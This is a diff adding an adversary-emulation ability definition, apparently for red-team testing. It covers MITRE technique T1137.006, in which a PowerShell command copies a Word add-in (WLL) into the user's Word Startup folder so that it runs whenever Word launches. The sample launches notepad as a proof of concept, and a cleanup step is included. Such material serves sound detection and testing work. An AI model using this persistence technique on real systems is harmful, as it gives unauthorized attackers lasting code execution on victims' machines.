@@ -1,0 +1,23 @@
+- description: "Creates a Word Add-in file (WLL) which runs automatically when Word\
+    \ is started\nThe sample WLL provided launches the notepad as a proof-of-concept\
+    \ for persistent execution from Office.\nSuccessfully tested on 32-bit Office\
+    \ 2016. Not successful from microsoft 365 version of Office. \n"
+  id: a21bd769c3b6c334a2a0f094a59c7a51
+  name: Persistent Code Execution Via Word Add-in File (WLL)
+  platforms:
+    windows:
+      psh:
+        cleanup: Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore; Start-Sleep
+          3; Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction
+          Ignore
+        command: $wdApp = New-Object -COMObject "Word.Application"; if(-not $wdApp.path.contains("Program
+          Files (x86)"))  ; {;   Write-Host "64-bit Office";   Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"
+          "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"        ; }; else{;   Write-Host
+          "32-bit Office";   Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"
+          "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"; }; Stop-Process -Name
+          "WinWord" ; Start-Process "WinWord"
+        payloads: []
+  tactic: persistence
+  technique:
+    attack_id: T1137.006
+    name: 'Office Application Startup: Add-ins'
